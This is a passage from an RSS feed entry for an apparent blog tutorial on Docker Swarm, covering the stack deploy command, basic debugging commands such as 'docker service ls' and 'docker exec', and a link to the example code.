&lt;p&gt;&lt;code&gt;docker stack deploy -c docker/app.docker-compose.yaml my-app&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;-c&lt;/code&gt; indicates the compose file.&lt;/p&gt;

&lt;p&gt;BTW if you get a message like "services.my-app Additional property {name} is not allowed" you probably misspelled something.&lt;/p&gt;

&lt;p&gt;If all is well this will start you app on localhost:8080.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#debugging-swarm"&gt;
  &lt;/a&gt;
  Debugging Swarm
&lt;/h2&gt;

&lt;p&gt;I have less experience here but the main commands you can use are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;docker service ls&lt;/code&gt; - To list services&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;docker ps&lt;/code&gt; - To list docker process, that is running containers&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;docker exec -it {containerId} /bin/bash&lt;/code&gt; - get a shell to the running container (use /bin/sh depending on Linux version).  You can lookup the container id from &lt;code&gt;docker ps&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#beyond"&gt;
  &lt;/a&gt;
  Beyond
&lt;/h2&gt;

&lt;p&gt;This was just a very basic tutorial.  The next steps might be adding replicas or change the resource limits on pods/containers.  These tools are ridiculously complex.&lt;/p&gt;

&lt;p&gt;You can find the full code here: &lt;a href="https://github.com/ndesmic/orchestration-basics/tree/v1.0"&gt;https://github.com/ndesmic/orchestration-basics/tree/v1.0&lt;/a&gt;&lt;/p&gt;

</description>
      <category>kubernetes</category>
      <category>docker</category>
      <category>deno</category>
    </item>
  </channel>
</rss>
